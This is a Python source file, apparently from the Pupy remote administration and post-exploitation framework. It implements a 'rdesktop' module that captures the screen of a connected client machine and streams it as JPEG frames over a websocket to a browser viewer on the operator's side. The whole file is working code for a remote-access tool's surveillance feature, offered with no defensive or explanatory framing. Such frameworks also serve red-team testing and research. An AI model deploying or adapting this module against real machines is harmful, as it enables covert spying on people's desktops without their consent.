# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyModule import *
from pupylib.PupyWeb import *
import base64
import subprocess
import time
import threading

__class_name__="RemoteDesktopModule"

class RdesktopWebSocketHandler(WebSocketHandler):
    def initialize(self, client, refresh_interval, quality):
        self.client=client
        self.width=None
        self.height=None
        self.refresh_interval=refresh_interval
        self.quality=quality
        self.remote_streamer=None

    def on_open(self):
        #self.set_nodelay(True)
        pass
    def on_message(self, message):        
        if message=="start_stream":
            self.width, self.height = self.client.conn.modules['rdesktop'].get_screen_size()
            self.start_stream()
        else:
            logging.error("unknown message:"+message)

    def update_video_callback(self, jpg_data):
        try:
            self.write_message(json.dumps({'screen': base64.b64encode(jpg_data), 'width': self.width, 'height': self.height}))
        except tornado.websocket.WebSocketClosedError:
            pass

    def start_stream(self):
        logging.debug("starting video stream stream ...")
        if self.remote_streamer:
            self.remote_streamer.stop()
        self.remote_streamer=self.client.conn.modules['rdesktop'].VideoStreamer(self.update_video_callback, refresh_interval=self.refresh_interval, quality=self.quality)
        self.remote_streamer.start()
        logging.debug("streaming video started")

    def on_close(self):
        if self.remote_streamer:
            self.remote_streamer.stop()


class IndexHandler(RequestHandler):
    def initialize(self, client):
        self.client = client

    @tornado.web.asynchronous
    def get(self):
        self.render("rdesktop/index.html", port=self.client.pupsrv.pupweb.port)

@config(category="admin", tags=["rdesktop","rdp", "vnc", "remote", "desktop"], compat=['windows', 'linux', 'darwin'])
class RemoteDesktopModule(PupyModule):
    """ Start a remote desktop session using a browser websocket client """

    dependencies = ['mss', 'rdesktop']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="rdesktop", description=self.__doc__)
        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open a browser tab on the handler url')
        self.arg_parser.add_argument('-r', '--refresh-interval', default=0.02, type=float, help='refresh interval. Set to 0 for best reactivity')
        self.arg_parser.add_argument('-q', '--quality', default=75, type=int, help='image quality best_quality=95 worst_quality=20')
        #self.arg_parser.add_argument('text', help='text to print in the msgbox :)')


    def run(self, args):
        self.web_handlers=[
            (r'/?', IndexHandler, {'client': self.client}),
            (r'/ws', RdesktopWebSocketHandler, {'client': self.client, 'refresh_interval': args.refresh_interval, 'quality':args.quality}),
        ]
        url=self.start_webplugin()
        self.success("Web handler started on %s"%url)
        if args.view:
            config = self.client.pupsrv.config or PupyConfig()
            viewer = config.get('default_viewers', 'browser')
            subprocess.Popen([viewer, url])

